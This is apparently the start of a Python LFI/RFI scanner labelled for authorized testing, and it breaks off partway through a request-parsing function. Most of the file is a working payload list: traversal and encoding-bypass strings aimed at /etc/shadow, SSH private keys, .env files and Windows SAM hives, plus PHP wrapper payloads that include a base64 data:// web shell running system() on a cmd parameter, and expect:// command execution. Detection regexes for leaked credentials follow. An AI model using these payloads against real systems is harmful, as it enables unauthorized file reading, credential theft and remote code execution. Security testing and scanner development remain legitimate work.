#!/usr/bin/env python3
"""
LFI/RFI Vulnerability Scanner
For authorized penetration testing and security research only.
"""

import requests
import argparse
import os
import sys
import json
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from pathlib import Path
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ─── PAYLOADS ────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [

    # ── Basic traversal (Linux) ───────────────────────────────────────────────
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../etc/issue",
    "../../../../etc/os-release",
    "../../../../etc/group",
    "../../../../etc/crontab",
    "../../../../etc/fstab",
    "../../../../etc/mtab",
    "../../../../etc/environment",
    "../../../../etc/profile",
    "../../../../etc/bashrc",
    "../../../../etc/ssh/sshd_config",
    "../../../../root/.ssh/id_rsa",
    "../../../../root/.bash_history",
    "../../../../home/user/.bash_history",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../proc/self/status",
    "../../../../proc/self/fd/0",
    "../../../../proc/version",
    "../../../../proc/net/tcp",
    "../../../../proc/net/fds",

    # ── Null byte injection (PHP < 5.3.4) ────────────────────────────────────
    "../../../etc/passwd%00",
    "../../../../etc/passwd%00",
    "../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%00",
    "../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd%00",
    "../../../../etc/passwd\x00",
    "../../../../etc/passwd%00.php",
    "../../../../etc/passwd%00.html",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00index.php",
    "../../../../../../../../../../etc/passwd%00",
    "../../../etc/shadow%00",
    "../../../etc/hosts%00",
    "../../../proc/self/environ%00",

    # ── URL-encoded single encoding ───────────────────────────────────────────
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd%00",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00",

    # ── Double encoding ───────────────────────────────────────────────────────
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "%252e%252e%252fetc%252fpasswd%00",
    "..%252F..%252F..%252Fetc%252Fpasswd%00",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd%00",

    # ── UTF-8 / Overlong encoding ─────────────────────────────────────────────
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
    "%c1%1c%c1%1c/%c1%1c%c1%1c/%c1%1c%c1%1c/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",

    # ── Path truncation (PHP 4096-byte cutoff) ────────────────────────────────
    "../../../etc/passwd" + "." * 500,
    "../../../etc/passwd" + "/" * 500,
    "../../../etc/passwd" + "/." * 250,
    "../../../../etc/passwd" + "." * 500,
    "../../../../etc/passwd" + "/" * 500,
    "../../../../etc/passwd" + "/." * 250,
    "../../../etc/passwd" + "\\." * 250,
    "../../../" + "A" * 200 + "/../../../../etc/passwd",
    "../../../" + "A/" * 100 + "../../../../etc/passwd",
    "../../../etc/passwd" + "." * 200 + "%00",

    # ── Filter bypass techniques ──────────────────────────────────────────────
    "....//....//....//etc/passwd",
    "....//....//....//....//etc/passwd",
    r"....\/....\/....\/etc/passwd",
    "..///////..////..//////etc/passwd",
    "..///..///..///etc/passwd",
    r"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
    r"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
    ".././.././.././etc/passwd",
    ".././.././.././.././etc/passwd",
    "..././..././..././etc/passwd",
    ".../.../.../.../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
    ".. /.. /.. /etc/passwd",
    "..%20/..%20/..%20/etc/passwd",
    "../../../../etc/passwd;.jpg",
    "../../../../etc/passwd;index.php",

    # ── Windows path traversal ────────────────────────────────────────────────
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..\\..\\..\\..\\windows\\repair\\sam",
    "..\\..\\..\\..\\windows\\repair\\system",
    "..\\..\\..\\..\\windows\\repair\\security",
    "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
    "..%5C..%5C..%5C..%5Cboot.ini",
    "..%255C..%255C..%255Cwindows%255Cwin.ini",
    "..%255C..%255C..%255C..%255Cwindows%255Cwin.ini",
    "../..\\../..\\windows\\win.ini",
    "..%2F..%5C..%2F..%5Cwindows%5Cwin.ini",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:/windows/win.ini",
    "C:/boot.ini",
    "C:/inetpub/wwwroot/web.config",
    "..\\..\\..\\..\\windows\\win.ini%00",
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini%00",

    # ── Absolute Linux paths ──────────────────────────────────────────────────
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/os-release",
    "/etc/crontab",
    "/etc/fstab",
    "/etc/mtab",
    "/etc/environment",
    "/etc/profile",
    "/etc/bashrc",
    "/etc/ssh/sshd_config",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/etc/mysql/my.cnf",
    "/etc/php/php.ini",
    "/etc/php.ini",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/version",
    "/proc/net/tcp",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/mail",
    "/var/log/vsftpd.log",
    "/var/log/sshd.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",

    # ── PHP wrappers ──────────────────────────────────────────────────────────
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/read=string.toupper|string.rot13/resource=index.php",
    "php://filter/string.rot13/resource=index.php",
    "php://input",
    "php://stdin",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "data://text/plain,<?php phpinfo();?>",
    "expect://id",
    "expect://whoami",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file://localhost/etc/passwd",
    "file://localhost/etc/hosts",
    "zip://shell.jpg%23shell.php",
    "phar://shell.jpg/shell.php",

    # ── php://filter iconv chain ──────────────────────────────────────────────
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-32/resource=index.php",
    "php://filter/convert.iconv.UTF-8.LATIN1/resource=index.php",
    "php://filter/convert.iconv.ISO-8859-1.UTF-8/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16LE/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16BE/resource=index.php",
    "php://filter/convert.iconv.UTF-16LE.UTF-8/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UCS-4/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UCS-4LE/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16|convert.base64-encode/resource=index.php",
    "php://filter/read=convert.iconv.UTF-8.UTF-16/convert.base64-encode/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.iconv.UTF-8.UTF-16BE|convert.base64-encode/resource=index.php",
    "php://filter/convert.iconv.ISO-8859-1.UTF-8|convert.base64-encode/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UCS-4|convert.base64-encode/resource=index.php",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd",
    "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=../../../etc/passwd",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php",
    "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=config.php",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=../config/database.php",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=../app/config.php",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=.env",
    "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=.env",

    # ── LFI-FD check — /proc/self/fd/* ──────────────────────────────────────
    "../../../../proc/self/fd/0",
    "../../../../proc/self/fd/1",
    "../../../../proc/self/fd/2",
    "../../../../proc/self/fd/3",
    "../../../../proc/self/fd/4",
    "../../../../proc/self/fd/5",
    "../../../../proc/self/fd/6",
    "../../../../proc/self/fd/7",
    "../../../../proc/self/fd/8",
    "../../../../proc/self/fd/9",
    "../../../../proc/self/fd/10",
    "../../../../proc/self/fd/11",
    "../../../../proc/self/fd/12",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/proc/self/fd/3",
    "/proc/self/fd/4",
    "/proc/self/fd/5",
    "/proc/self/fd/6",
    "/proc/self/fd/7",
    "/proc/self/fd/8",
    "/proc/self/fd/9",
    "/proc/self/fd/10",
    "/proc/self/fd/11",
    "/proc/self/fd/12",
    "/proc/1/fd/0",
    "/proc/1/fd/1",
    "/proc/1/fd/2",
    "/proc/self/fdinfo/1",
    "/proc/self/fdinfo/2",

    # ── Extended Linux files ──────────────────────────────────────────────────
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/gshadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/domainname",
    "/etc/resolv.conf",
    "/etc/nsswitch.conf",
    "/etc/host.conf",
    "/etc/networks",
    "/etc/protocols",
    "/etc/services",
    "/etc/issue",
    "/etc/issue.net",
    "/etc/os-release",
    "/etc/debian_version",
    "/etc/redhat-release",
    "/etc/centos-release",
    "/etc/fedora-release",
    "/etc/SuSE-release",
    "/etc/arch-release",
    "/etc/lsb-release",
    "/etc/timezone",
    "/etc/localtime",
    "/etc/crontab",
    "/etc/cron.d/crontab",
    "/etc/cron.daily",
    "/etc/at.allow",
    "/etc/at.deny",
    "/etc/cron.allow",
    "/etc/cron.deny",
    "/etc/fstab",
    "/etc/mtab",
    "/etc/mntent",
    "/etc/environment",
    "/etc/profile",
    "/etc/bashrc",
    "/etc/bash.bashrc",
    "/etc/zshrc",
    "/etc/shells",
    "/etc/login.defs",
    "/etc/security/limits.conf",
    "/etc/security/access.conf",
    "/etc/pam.conf",
    "/etc/pam.d/common-auth",
    "/etc/sudoers",
    "/etc/sudoers.d/README",
    "/etc/ld.so.conf",
    "/etc/ld.so.preload",
    "/etc/sysctl.conf",
    "/proc/version",
    "/proc/cmdline",
    "/proc/self/cmdline",
    "/proc/self/environ",
    "/proc/self/status",
    "/proc/self/maps",
    "/proc/self/mounts",
    "/proc/net/arp",
    "/proc/net/route",
    "/proc/net/tcp",
    "/proc/net/tcp6",
    "/proc/net/udp",
    "/proc/net/if_inet6",
    "/proc/net/fib_trie",
    "/proc/net/dev",
    "/proc/sysinfo",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/mounts",
    "/proc/filesystems",
    "/proc/1/cmdline",
    "/proc/1/maps",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config",
    "/etc/ssh/ssh_host_rsa_key",
    "/etc/ssh/ssh_host_dsa_key",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_dsa",
    "/root/.ssh/id_ecdsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts",
    "/home/www-data/.ssh/id_rsa",
    "/root/.bash_history",
    "/root/.bashrc",
    "/root/.profile",
    "/root/.bash_profile",
    "/root/.bash_logout",
    "/root/.mysql_history",
    "/root/.viminfo",
    "/root/.gitconfig",
    "/root/.npmrc",
    "/root/.pypirc",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/faillog",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
    "/var/log/kern.log",
    "/var/log/dmesg",
    "/var/log/boot.log",
    "/var/log/daemon.log",
    "/var/log/mail.log",
    "/var/log/mail.err",
    "/var/log/cron.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/lighttpd/access.log",
    "/var/log/lighttpd/error.log",
    "/var/log/vsftpd.log",
    "/var/log/proftpd/proftpd.log",
    "/var/log/pure-ftpd/pure-ftpd.log",
    "/var/log/mysql/error.log",
    "/var/log/mysql.log",
    "/var/log/postgresql/postgresql.log",
    "/var/log/redis/redis-server.log",
    "/var/log/mongodb/mongod.log",
    "/var/log/sshd.log",
    "/var/log/fail2ban.log",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/httpd.conf",
    "/etc/apache2/ports.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/apache2/sites-available/default",
    "/etc/apache2/envvars",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/conf.d/ssl.conf",
    "/usr/local/apache2/conf/httpd.conf",
    "/usr/local/apache/conf/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-enabled/default",
    "/etc/nginx/conf.d/default.conf",
    "/usr/local/nginx/conf/nginx.conf",
    "/etc/lighttpd/lighttpd.conf",
    "/etc/php.ini",
    "/etc/php/php.ini",
    "/etc/php5/apache2/php.ini",
    "/etc/php5/cli/php.ini",
    "/etc/php7.0/apache2/php.ini",
    "/etc/php7.0/cli/php.ini",
    "/etc/php7.4/apache2/php.ini",
    "/etc/php7.4/cli/php.ini",
    "/etc/php8.0/apache2/php.ini",
    "/etc/php8.0/cli/php.ini",
    "/etc/php8.1/apache2/php.ini",
    "/etc/php8.2/apache2/php.ini",
    "/usr/local/lib/php.ini",
    "/etc/mysql/my.cnf",
    "/etc/mysql/mysql.conf.d/mysqld.cnf",
    "/etc/my.cnf",
    "/etc/mysql/debian.cnf",
    "/var/lib/mysql/mysql.err",
    "/etc/postgresql/pg_hba.conf",
    "/var/lib/pgsql/data/postgresql.conf",
    "../../../../.env",
    "../../../.env",
    "../../.env",
    "../.env",
    ".env",
    "../../../../config.php",
    "../../../../wp-config.php",
    "../../../../configuration.php",
    "../../../../config/database.php",
    "../../../../config/app.php",
    "../../../../.htpasswd",
    "../../../../.htaccess",

    # ── Mac / macOS files ──────────────────────────────────────────────────────
    "/etc/passwd",
    "/private/etc/passwd",
    "/private/etc/shadow",
    "/private/etc/master.passwd",
    "/private/etc/group",
    "/private/etc/hosts",
    "/private/etc/resolv.conf",
    "/private/etc/sudoers",
    "/private/etc/shells",
    "/private/etc/syslog.conf",
    "/private/etc/newsyslog.conf",
    "/private/etc/pam.d/login",
    "/private/etc/pam.d/sudo",
    "/private/var/log/system.log",
    "/private/var/log/install.log",
    "/private/var/log/wifi.log",
    "/Library/Logs/DiagnosticReports",
    "/Library/Preferences/SystemConfiguration/preferences.plist",
    "/Library/Preferences/SystemConfiguration/NetworkInterfaces.plist",
    "/Users/admin/.bash_history",
    "/Users/admin/.zsh_history",
    "/Users/admin/.ssh/id_rsa",
    "/Users/admin/.ssh/authorized_keys",
    "/Users/admin/Library/Keychains",
    "/System/Library/CoreServices/SystemVersion.plist",
    "/usr/local/etc/apache2/httpd.conf",
    "/usr/local/etc/nginx/nginx.conf",
    "/usr/local/etc/php.ini",
    "/usr/local/etc/my.cnf",
    "/Applications/XAMPP/xamppfiles/etc/httpd.conf",
    "/Applications/XAMPP/xamppfiles/etc/php.ini",

    # ── Windows files ──────────────────────────────────────────────────────────
    "C:/Windows/win.ini",
    "C:/Windows/system.ini",
    "C:/Windows/boot.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/drivers/etc/networks",
    "C:/Windows/System32/drivers/etc/services",
    "C:/Windows/System32/drivers/etc/protocol",
    "C:/Windows/repair/sam",
    "C:/Windows/repair/system",
    "C:/Windows/repair/security",
    "C:/Windows/repair/software",
    "C:/Windows/System32/config/SAM",
    "C:/Windows/System32/config/SYSTEM",
    "C:/Windows/System32/config/SECURITY",
    "C:/Windows/System32/config/SOFTWARE",
    "C:/Windows/System32/config/DEFAULT",
    "C:/Windows/System32/config/RegBack/SAM",
    "C:/Windows/System32/config/RegBack/SYSTEM",
    "C:/Windows/System32/eula.txt",
    "C:/Windows/System32/license.rtf",
    "C:/Windows/WindowsUpdate.log",
    "C:/Windows/debug/NetSetup.log",
    "C:/Windows/setupact.log",
    "C:/Windows/PFRO.log",
    "C:/inetpub/logs/LogFiles",
    "C:/inetpub/wwwroot/web.config",
    "C:/inetpub/wwwroot/global.asax",
    "C:/inetpub/wwwroot/web.xml",
    "C:/Windows/System32/inetsrv/config/applicationHost.config",
    "C:/Windows/System32/inetsrv/config/schema/IIS_schema.xml",
    "C:/xampp/apache/conf/httpd.conf",
    "C:/xampp/apache/conf/extra/httpd-ssl.conf",
    "C:/xampp/php/php.ini",
    "C:/xampp/mysql/bin/my.ini",
    "C:/xampp/FileZillaFTP/FileZilla Server.xml",
    "C:/xampp/MercuryMail/MERCURY.INI",
    "C:/wamp/bin/apache/apache2.4.4/conf/httpd.conf",
    "C:/wamp/bin/php/php5.6.0/php.ini",
    "C:/wamp/bin/mysql/mysql5.6.17/my.ini",
    "C:/Program Files/Apache Group/Apache/conf/httpd.conf",
    "C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf",
    "C:/Program Files/MySQL/MySQL Server 5.5/my.ini",
    "C:/Program Files/MySQL/MySQL Server 5.6/my.ini",
    "C:/Program Files (x86)/MySQL/MySQL Server 5.6/my.ini",
    "C:/ProgramData/MySQL/MySQL Server 5.6/my.ini",
    "C:/Users/Administrator/Desktop/proof.txt",
    "C:/Users/Administrator/Desktop/user.txt",
    "C:/Users/Administrator/AppData/Roaming/FileZilla/sitemanager.xml",
    "C:/Users/Administrator/.ssh/id_rsa",
    "C:%5CWindows%5Cwin.ini",
    "C:%5CWindows%5Csystem.ini",
    "C:%5CWindows%5Cboot.ini",
    "C:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
    "C:%5Cinetpub%5Cwwwroot%5Cweb.config",
    "..%5C..%5C..%5C..%5CWindows%5Cwin.ini",
    "..%5C..%5C..%5C..%5CWindows%5Csystem.ini",

    # ── Web server / web app files ─────────────────────────────────────────────
    ".htpasswd",
    ".htaccess",
    "web.config",
    "Web.config",
    "WEB-INF/web.xml",
    "WEB-INF/classes/META-INF/context.xml",
    "WEB-INF/classes/META-INF/persistence.xml",
    "META-INF/context.xml",
    "config.php",
    "configuration.php",
    "config.inc.php",
    "config/config.php",
    "include/config.php",
    "includes/config.php",
    "app/config/parameters.yml",
    "app/config/parameters.yaml",
    "config/database.yml",
    "config/secrets.yml",
    ".env",
    ".env.local",
    ".env.production",
    ".env.backup",
    "wp-config.php",
    "wp-config.php.bak",
    "wp-config.php.old",
    "wp-config.php.orig",
    "../wp-config.php",
    "../../wp-config.php",
    "../../../wp-config.php",
    "sites/default/settings.php",
    "sites/default/settings.local.php",
    "application/config/database.php",
    "application/config/config.php",
    "config/autoload.php",
    "system/application/config/config.php",
    "lib/config.php",
    "app/etc/local.xml",
    "app/etc/env.php",
    "var/www/html/index.php",
    "LocalSettings.php",
    "config/settings.py",
    "settings.py",
    "config/settings.py",
    "config/config.rb",
    "config/database.yml",
    "config/secrets.yml",
    "application.yml",
    "pom.xml",
    "build.xml",
]

# ─── DETECTION SIGNATURES ────────────────────────────────────────────────────

LFI_SIGNATURES = [
    r"root:.*:0:0:",
    r"root:x:0:0:",
    r"daemon:.*:/usr/sbin",
    r"nobody:.*:/nonexistent",
    r"www-data:.*:/var/www",
    r"apache:.*:/var/www",
    r"nginx:.*:/var/cache/nginx",
    r"mysql:.*:/var/lib/mysql",
    r"bin:x:1:1:",
    r"adm:x:3:4:",
    r"\$6\$[A-Za-z0-9./]{8}",
    r"\$5\$[A-Za-z0-9./]{8}",
    r"\$1\$[A-Za-z0-9./]{8}",
    r"\$2[aby]\$\d+\$",
    r"bin/bash",
    r"bin/sh",
    r"bin/zsh",
    r"bin/false",
    r"bin/nologin",
    r"/home/\w+",
    r"Linux version \d+\.\d+",
    r"gcc version \d+\.\d+",
    r"BOOT_IMAGE=",
    r"ro root=",
    r"MemTotal:\s+\d+ kB",
    r"MemFree:\s+\d+ kB",
    r"processor\s*:\s*\d+",
    r"model name\s*:.*(Intel|AMD|ARM)",
    r"# /etc/fstab",
    r"UUID=.*ext[234]",
    r"UUID=.*xfs",
    r"UUID=.*btrfs",
    r"tmpfs.*defaults",
    r"PermitRootLogin",
    r"AuthorizedKeysFile",
    r"PasswordAuthentication",
    r"Port 22",
    r"-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----",
    r"-----BEGIN CERTIFICATE-----",
    r"/var/www/html",
    r"ServerName\s+\S+",
    r"DocumentRoot",
    r"Listen 80",
    r"user\s+nginx",
    r"user\s+www-data",
    r"sl\s+local_address\s+rem_address",
    r"Iface\s+Destination\s+Gateway",
    r"SHELL=/bin/(sh|bash)",
    r"\*\s+\*\s+\*\s+\*\s+\*",
    r"@reboot",
    r"@daily",
    r"DB_PASSWORD\s*=",
    r"DB_USERNAME\s*=",
    r"DB_HOST\s*=",
    r"APP_KEY\s*=",
    r"APP_SECRET\s*=",
    r"SECRET_KEY\s*=",
    r"AWS_ACCESS_KEY_ID\s*=",
    r"AWS_SECRET_ACCESS_KEY\s*=",
    r"STRIPE_SECRET\s*=",
    r"MAIL_PASSWORD\s*=",
    r"\[boot loader\]",
    r"multi\(0\)disk\(0\)",
    r"\[operating systems\]",
    r"\[extensions\]",
    r"\[fonts\]",
    r"\[mci extensions\]",
    r"\[drivers\]",
    r"MAPI=1",
    r"system32\\\\",
    r"\[Version\]",
    r"Signature=\$chicago\$",
    r"Signature=\$WINDOWS NT\$",
    r"\[386Enh\]",
    r"WOW86=",
    r"<configuration>",
    r"<connectionStrings>",
    r"<appSettings>",
    r"<system\.web>",
    r"<system\.webServer>",
    r"<authentication\s+mode=",
    r"IIS.*Version",
    r"Microsoft-IIS/\d+\.\d+",
    r"_www:.*:/private/var/empty",
    r"_mysql:.*:/var/empty",
    r"_daemon:.*:/var/empty",
    r"com\.apple\.",
    r"ProductName.*Mac OS X",
    r"ProductVersion.*\d+\.\d+\.\d+",
    r"kernelVersion.*Darwin",
    r"\[PHP\]",
    r"allow_url_fopen\s*=",
    r"allow_url_include\s*=",
    r"extension_dir\s*=",
    r"open_basedir\s*=",
    r"disable_functions\s*=",
    r"magic_quotes_gpc\s*=",
    r"session\.save_path\s*=",
    r"upload_tmp_dir\s*=",
    r"error_log\s*=",
    r"cm9vdDp4OjA6MDo",
    r"cm9vdDokNiQ",
    r"cm9vd",
    r"L2V0Yy9wYXNzd2Q",
    r"PD9waHA",
    r"PD9waHAgZWNobyBzeXN0",
    r"PGh0bWw",
    r"Pz4K",
    r"REVGQVVMVF9TVEVBTE",
    r"\\x00[a-zA-Z]\\x00[a-zA-Z]",
    r"\d+\.\d+\.\d+\.\d+ - - \[",
    r"\"(GET|POST|PUT|DELETE|HEAD) /.*HTTP/\d\.\d\" \d{3}",
    r"\[error\] \[client",
    r"\[crit\]|\[alert\]|\[emerg\]",
    r"FastCGI.*error",
    r"\[mysqld\]",
    r"datadir\s*=\s*/var",
    r"bind-address\s*=",
    r"password\s*=\s*\S+",
    r"local\s+all\s+all",
    r"host\s+all\s+all\s+\d+\.\d+\.\d+",
    r"<\?php",
    r"DB_PASSWORD",
    r"define\s*\(\s*['\"]DB_(USER|PASS|HOST|NAME)['\"]",
    r"mysqli_connect\s*\(",
    r"\$_SERVER\[",
    r"\$_GET\[",
    r"\$_POST\[",
    r"define\s*\(\s*['\"]DB_NAME['\"]",
    r"define\s*\(\s*['\"]TABLE_PREFIX['\"]",
    r"Authentication Unique Keys",
    r"\$databases\s*=\s*array",
    r"APP_ENV\s*=\s*(local|production|staging)",
    r"DB_CONNECTION\s*=\s*mysql",
]

RFI_SIGNATURES = [
    r"evil\.com",
    r"shell",
    r"<\?php",
    r"phpinfo",
    r"eval\(",
    r"system\(",
    r"passthru\(",
    r"exec\(",
]

ERROR_SIGNATURES = [
    r"Warning:.*include",
    r"Warning:.*require",
    r"failed to open stream",
    r"No such file or directory",
    r"open_basedir restriction",
    r"Warning:.*file_get_contents",
    r"include_path",
    r"allow_url_include",
]

# ─── COLORS ──────────────────────────────────────────────────────────────────

def ok(msg):    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def info(msg):  print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")
def warn(msg):  print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def err(msg):   print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
def vuln(msg):  print(f"{Fore.RED}{Style.BRIGHT}[VULN]{Style.RESET_ALL} {msg}")
def error_leak(msg): print(f"{Fore.YELLOW}{Style.BRIGHT}[ERROR-LEAK]{Style.RESET_ALL} {msg}")

# ─── BURP REQUEST PARSER ─────────────────────────────────────────────────────

def _parse_raw_http(raw_text, fallback_host='', filepath=''):
    import re as _re
    from urllib.parse import urlparse as _up2
    
    raw_text = raw_text.replace('\r\r', '\r\n')
    raw_text = raw_text.replace('\r\n', '\n')
    raw_text = raw_text.replace('\r', '\n')
    raw_text = raw_text.lstrip('\ufeff')
    
    lines = raw_text.split('\n')
    if not lines or not lines[0].strip():
        return None
    
    rl = lines[0].strip().split(' ')
    if len(rl) < 2:
        return None
    
    method = rl[0].upper()
    raw_path = rl[1]
    
    headers = {}
    i = 1
    while i < len(lines):
        line = lines[i].strip()
        if not line:
            i += 1
            break
        if ':' in line:
            k, _, v = line.partition(':')
            k = k.strip()
            v = v.strip()
            if k:
                headers[k] = v
        i += 1
    
    body = '\n'.join(lines[i:]).strip() if i < len(lines) else ''
    
    host_header = headers.get('Host', '').strip()
    
    if not host_header:
        if raw_path.startswith('http://') or raw_path.startswith('https://'):
            parsed = _up2(raw_path)
            host_header = parsed.netloc
        elif headers.get('Origin'):
            parsed = _up2(headers.get('Origin'))
            host_header = parsed.netloc
        elif headers.get('Referer'):
            parsed = _up2(headers.get('Referer'))
            host_header = parsed.netloc
        elif fallback_host:
            host_header = fallback_host
    
    if not host_header and filepath:
        fname = os.path.basename(filepath)
        m = _re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?)', fname)
        if m:
            host_header = m.group(1)
        else:
            m = _re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}(?::\d+)?)', fname)
            if m:
